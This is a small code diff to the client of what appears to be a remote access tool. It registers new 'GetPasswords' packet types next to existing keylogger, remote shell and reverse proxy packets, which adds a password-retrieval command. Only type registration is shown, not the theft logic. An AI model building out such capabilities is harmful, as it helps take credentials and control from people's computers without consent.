@@ -98,6 +98,8 @@ namespace xClient
                 typeof (Core.Packets.ClientPackets.DoShellExecuteResponse),
                 typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
                 typeof (Core.Packets.ClientPackets.GetKeyloggerLogsResponse),
+                typeof (Core.Packets.ClientPackets.GetPasswordsResponse),
+                typeof (Core.Packets.ServerPackets.GetPasswords),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyData),
